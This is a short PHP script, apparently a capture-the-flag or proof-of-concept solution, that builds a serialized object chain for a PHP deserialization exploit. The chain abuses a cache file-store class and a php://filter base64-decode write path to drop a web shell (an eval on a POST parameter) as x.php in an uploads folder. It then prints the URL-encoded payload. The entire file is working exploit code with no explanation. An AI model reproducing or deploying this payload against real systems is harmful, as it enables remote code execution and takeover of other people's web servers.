<?php

class A {
	protected $store;
	protected $key = 'x.php';
	protected $expire;
	public $complete = 1;
	public $autosave = false;
	public function __construct() {
		$this->store = $store = new B();
		$this->cache = ['a' => [
			'visibility' => base64_encode('<?php @eval($_POST[1]);phpinfo();?>a'),
		]];
	}
}
class B {
	public $options = [
		'expire' => 1,
		'data_compress' => 0,
		'prefix' => 'php://filter/write=convert.base64-decode/resource=./uploads/',
		'serialize' => 'trim',
	];
	public $writeTimes = 0;
}
$a = new A();
$exp = serialize($a);
echo urlencode($exp);